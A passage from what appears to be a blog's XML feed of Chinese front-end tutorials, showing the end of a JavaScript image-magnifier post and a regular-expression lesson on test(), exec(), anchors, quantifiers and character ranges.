class="selector-class">.layer</span> &#123;<span class="comment">/*黑色遮罩层*/</span></span><br><span class="line"><span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.3</span>);</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">display</span>: none;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JavaScript部分"><a href="#JavaScript部分" class="headerlink" title="JavaScript部分"></a>JavaScript部分</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> small = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.small&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> middle = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.middle&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> large = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.large&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> layer = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.layer&#x27;</span>)</span><br><span class="line"></span><br><span class="line">small.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseover&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(e.<span class="property">target</span>.<span class="property">tagName</span> === <span class="string">&#x27;IMG&#x27;</span>) &#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.active&#x27;</span>).<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;active&#x27;</span>)</span><br><span class="line">e.<span class="property">target</span>.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;active&#x27;</span>)</span><br><span class="line">middle.<span class="title function_">querySelector</span>(<span class="string">&#x27;img&#x27;</span>).<span class="property">src</span> = e.<span class="property">target</span>.<span class="property">src</span></span><br><span class="line">large.<span class="property">style</span>.<span class="property">backgroundImage</span> = <span class="string">`url(<span class="subst">$&#123;e.target.src&#125;</span>)`</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">middle.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseenter&#x27;</span>, show)</span><br><span class="line">middle.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseleave&#x27;</span>, hide)</span><br><span class="line">large.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseenter&#x27;</span>, show)</span><br><span class="line">large.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseleave&#x27;</span>, hide)</span><br><span class="line"><span class="keyword">let</span> timeId = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="built_in">clearTimeout</span>(timeId)</span><br><span class="line">large.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;block&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hide</span>(<span class="params"></span>) &#123;</span><br><span class="line">timeId = <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">large.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span></span><br><span class="line">&#125;, <span class="number">200</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">middle.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseenter&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">layer.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;block&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">middle.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseleave&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">layer.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">middle.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mousemove&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> x = e.<span class="property">pageX</span> - middle.<span class="title function_">getBoundingClientRect</span>().<span class="property">left</span></span><br><span class="line"><span class="keyword">let</span> y = e.<span class="property">pageY</span> - middle.<span class="title function_">getBoundingClientRect</span>().<span class="property">top</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> mx = <span class="number">0</span>, my = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(x &lt; <span class="number">100</span>) mx = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span>(x &gt;= <span class="number">100</span> &amp;&amp; x &lt;= <span class="number">300</span>) mx = x - <span class="number">100</span></span><br><span class="line"><span class="keyword">if</span>(x &gt; <span class="number">300</span>) mx = <span class="number">200</span></span><br><span class="line"><span class="keyword">if</span>(y &lt; <span class="number">100</span>) my = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span>(y &gt;= <span class="number">100</span> &amp;&amp; y &lt;= <span class="number">300</span>) my = y - <span class="number">100</span></span><br><span class="line"><span class="keyword">if</span>(y &gt; <span class="number">300</span>) my = <span class="number">200</span></span><br><span class="line"></span><br><span class="line">layer.<span class="property">style</span>.<span class="property">left</span> = mx + <span class="string">&#x27;px&#x27;</span></span><br><span class="line">layer.<span class="property">style</span>.<span class="property">top</span> = my + <span class="string">&#x27;px&#x27;</span></span><br><span class="line"></span><br><span class="line">large.<span class="property">style</span>.<span class="property">backgroundPositionX</span> = -<span class="number">2</span> * mx + <span class="string">&#x27;px&#x27;</span></span><br><span class="line">large.<span class="property">style</span>.<span class="property">backgroundPositionY</span> = -<span class="number">2</span> * my + <span class="string">&#x27;px&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript-正则表达式</title>
      <link href="/2024/02/03/JavaScript-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2024/02/03/JavaScript-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p><strong>正则表达式</strong>（Regular Expression）是一种字符串匹配的模式（规则）</p><p><strong>使用场景</strong>：</p><ul><li>例如验证表单：手机号表单要求用户只能输入11位的数字 (匹配)</li><li>过滤掉页面内容中的一些敏感词(替换)，或从字符串中获取我们想要的特定部分(提取)等</li></ul><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><ol><li><strong>定义正则表达式语法</strong></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> reg =  <span class="regexp">/表达式/</span></span><br></pre></td></tr></table></figure><ul><li>其中<code>/ /</code>是正则表达式字面量</li><li>正则表达式也是<code>对象</code></li></ul><p> </p><ol start="2"><li><strong>判断是否有符合规则的字符串</strong></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regObj.<span class="title function_">test</span>(被检测的字符串)</span><br></pre></td></tr></table></figure><ul><li><code>test()方法</code> 用来查看正则表达式与指定的字符串是否匹配</li><li>如果正则表达式与指定的字符串匹配 ，返回<code>true</code>，否则<code>false</code></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 正则表达式的基本使用</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> str = <span class="string">&#x27;web前端开发&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 1. 定义规则</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> reg = <span class="regexp">/web/</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 2. 使用正则  test()</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg.<span class="title function_">test</span>(str))  <span class="comment">// true  如果符合规则匹配上则返回true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg.<span class="title function_">test</span>(<span class="string">&#x27;java开发&#x27;</span>))  <span class="comment">// false  如果不符合规则匹配上则返回 false</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li><strong>检索（查找）符合规则的字符串</strong></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regObj.<span class="title function_">exec</span>(被检测字符串)</span><br></pre></td></tr></table></figure><ul><li><code>exec()</code>方法，在一个指定字符串中执行一个搜索匹配</li><li>如果匹配成功，exec()方法返回一个数组，否则返回null</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> str = <span class="string">&#x27;Alien的前端开发笔记，有我学习前端的路线&#x27;</span></span><br><span class="line"><span class="keyword">const</span> regObj = <span class="regexp">/前端/</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(regObj.<span class="title function_">test</span>(str))  <span class="comment">// 检测是否有符合的字符串</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(regObj.<span class="title function_">exec</span>(str))  <span class="comment">// 检索符合的字符串位置</span></span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240203204747.png" alt="image.png"></p><h1 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h1><ol><li><strong>普通字符:</strong></li></ol><ul><li>大多数的字符仅能够描述它们本身，这些字符称作普通字符，例如所有的字母和数字。</li><li>普通字符只能够匹配字符串中与它们相同的字符。</li><li>比如，规定用户只能输入英文26个英文字母，普通字符的话 &#x2F;abcdefghijklmnopqrstuvwxyz&#x2F;</li></ul><ol start="2"><li><strong>元字符(特殊字符）</strong></li></ol><ul><li>一些具有特殊含义的字符，可以极大提高了灵活性和强大的匹配功能。</li><li>比如，规定用户只能输入英文26个英文字母，换成元字符写法： [a-z]</li></ul><ol start="3"><li><strong>参考文档</strong></li></ol><ul><li>MDN：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions</a></li><li>正则测试工具：<a href="https://tool.oschina.net/regex">https://tool.oschina.net/regex</a></li></ul><h2 id="边界符"><a href="#边界符" class="headerlink" title="边界符"></a>边界符</h2><p>正则表达式中的边界符（位置符）用来提示字符所处的位置，主要有两个字符</p><table><thead><tr><th>边界符</th><th>说明</th></tr></thead><tbody><tr><td>^</td><td>表示匹配行首的文本（以谁开始）</td></tr><tr><td>$</td><td>表示匹配行尾的文本（以谁结束）</td></tr></tbody></table><p>如果 <code>^</code> 和 <code>$</code> 在一起，表示必须是精确匹配</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 元字符之边界符</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 1. 匹配开头的位置 ^</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> reg = <span class="regexp">/^web/</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg.<span class="title function_">test</span>(<span class="string">&#x27;web前端&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg.<span class="title function_">test</span>(<span class="string">&#x27;前端web&#x27;</span>))  <span class="comment">// false</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg.<span class="title function_">test</span>(<span class="string">&#x27;前端web学习&#x27;</span>))  <span class="comment">// false</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg.<span class="title function_">test</span>(<span class="string">&#x27;we&#x27;</span>))  <span class="comment">// false</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 2. 匹配结束的位置 $</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> reg1 = <span class="regexp">/web$/</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg1.<span class="title function_">test</span>(<span class="string">&#x27;web前端&#x27;</span>))  <span class="comment">//  false</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg1.<span class="title function_">test</span>(<span class="string">&#x27;前端web&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg1.<span class="title function_">test</span>(<span class="string">&#x27;前端web学习&#x27;</span>))  <span class="comment">// false</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg1.<span class="title function_">test</span>(<span class="string">&#x27;we&#x27;</span>))  <span class="comment">// false  </span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 3. 精确匹配 ^ $</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> reg2 = <span class="regexp">/^web$/</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg2.<span class="title function_">test</span>(<span class="string">&#x27;web前端&#x27;</span>))  <span class="comment">//  false</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg2.<span class="title function_">test</span>(<span class="string">&#x27;前端web&#x27;</span>))  <span class="comment">// false</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg2.<span class="title function_">test</span>(<span class="string">&#x27;前端web学习&#x27;</span>))  <span class="comment">// false</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg2.<span class="title function_">test</span>(<span class="string">&#x27;we&#x27;</span>))  <span class="comment">// false </span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg2.<span class="title function_">test</span>(<span class="string">&#x27;web&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg2.<span class="title function_">test</span>(<span class="string">&#x27;webweb&#x27;</span>))  <span class="comment">// flase </span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h2><p>量词用来设定某个模式出现的次数</p><table><thead><tr><th>量词</th><th>说明</th></tr></thead><tbody><tr><td>*</td><td>重复零次或更多次</td></tr><tr><td>+</td><td>重复一次或更多次</td></tr><tr><td>?</td><td>重复零次或一次</td></tr><tr><td>{n}</td><td>重复n次</td></tr><tr><td>{n,}</td><td>重复n次或更多次</td></tr><tr><td>{n,m}</td><td>重复n到m次</td></tr></tbody></table><p><strong>注意</strong>： 逗号左右两侧千万不要出现空格</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 元字符之量词</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 1. * 重复次数 &gt;= 0 次</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> reg1 = <span class="regexp">/^w*$/</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg1.<span class="title function_">test</span>(<span class="string">&#x27;&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg1.<span class="title function_">test</span>(<span class="string">&#x27;w&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg1.<span class="title function_">test</span>(<span class="string">&#x27;ww&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 2. + 重复次数 &gt;= 1 次</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> reg2 = <span class="regexp">/^w+$/</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg2.<span class="title function_">test</span>(<span class="string">&#x27;&#x27;</span>))  <span class="comment">// false</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg2.<span class="title function_">test</span>(<span class="string">&#x27;w&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg2.<span class="title function_">test</span>(<span class="string">&#x27;ww&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 3. ? 重复次数  0 || 1 </span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> reg3 = <span class="regexp">/^w?$/</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg3.<span class="title function_">test</span>(<span class="string">&#x27;&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg3.<span class="title function_">test</span>(<span class="string">&#x27;w&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg3.<span class="title function_">test</span>(<span class="string">&#x27;ww&#x27;</span>))  <span class="comment">// false</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 4. &#123;n&#125; 重复 n 次</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> reg4 = <span class="regexp">/^w&#123;3&#125;$/</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg4.<span class="title function_">test</span>(<span class="string">&#x27;&#x27;</span>))  <span class="comment">// false</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg4.<span class="title function_">test</span>(<span class="string">&#x27;w&#x27;</span>))  <span class="comment">// flase</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg4.<span class="title function_">test</span>(<span class="string">&#x27;ww&#x27;</span>))  <span class="comment">// false</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg4.<span class="title function_">test</span>(<span class="string">&#x27;www&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg4.<span class="title function_">test</span>(<span class="string">&#x27;wwww&#x27;</span>))  <span class="comment">// false</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 5. &#123;n,&#125; 重复次数 &gt;= n </span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> reg5 = <span class="regexp">/^w&#123;2,&#125;$/</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg5.<span class="title function_">test</span>(<span class="string">&#x27;&#x27;</span>))  <span class="comment">// false</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg5.<span class="title function_">test</span>(<span class="string">&#x27;w&#x27;</span>))  <span class="comment">// false</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg5.<span class="title function_">test</span>(<span class="string">&#x27;ww&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg5.<span class="title function_">test</span>(<span class="string">&#x27;www&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 6. &#123;n,m&#125;   n =&lt; 重复次数 &lt;= m</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> reg6 = <span class="regexp">/^w&#123;2,4&#125;$/</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg6.<span class="title function_">test</span>(<span class="string">&#x27;w&#x27;</span>))  <span class="comment">// false</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg6.<span class="title function_">test</span>(<span class="string">&#x27;ww&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg6.<span class="title function_">test</span>(<span class="string">&#x27;www&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg6.<span class="title function_">test</span>(<span class="string">&#x27;wwww&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg6.<span class="title function_">test</span>(<span class="string">&#x27;wwwww&#x27;</span>))  <span class="comment">// false</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 7. 注意事项： 逗号两侧千万不要加空格否则会匹配失败</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="范围"><a href="#范围" class="headerlink" title="范围"></a>范围</h2><p>表示字符的范围，定义的规则限定在某个范围，比如只能是英文字母，或者数字等等，用表示范围</p><table><thead><tr><th>字符</th><th>说明</th></tr></thead><tbody><tr><td>[abc]</td><td>匹配包含的单个字符，也就是a||b||c，多选一</td></tr><tr><td>[a-z]</td><td>连字符，用来指定字符范围，[a-z]表示a到z的26个字母</td></tr><tr><td>[^abc]</td><td>取反符，表示匹配除了26个小写字母以外的字符</td></tr></tbody></table><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 元字符之范围  []  </span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 1. [abc] 匹配包含的单个字符， 多选1</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> reg1 = <span class="regexp">/^[abc]$/</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg1.<span class="title function_">test</span>(<span class="string">&#x27;a&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg1.<span class="title function_">test</span>(<span class="string">&#x27;b&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg1.<span class="title function_">test</span>(<span class="string">&#x27;c&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg1.<span class="title function_">test</span>(<span class="string">&#x27;d&#x27;</span>))  <span class="comment">// false</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg1.<span class="title function_">test</span>(<span class="string">&#x27;ab&#x27;</span>))  <span class="comment">// false</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 2. [a-z] 连字符 单个</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> reg2 = <span class="regexp">/^[a-z]$/</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg2.<span class="title function_">test</span>(<span class="string">&#x27;a&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg2.<span class="title function_">test</span>(<span class="string">&#x27;p&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg2.<span class="title function_">test</span>(<span class="string">&#x27;0&#x27;</span>))  <span class="comment">// false</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg2.<span class="title function_">test</span>(<span class="string">&#x27;A&#x27;</span>))  <span class="comment">// false</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 想要包含小写字母，大写字母 ，数字</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> reg3 = <span class="regexp">/^[a-zA-Z0-9]$/</span></span></span><br><span 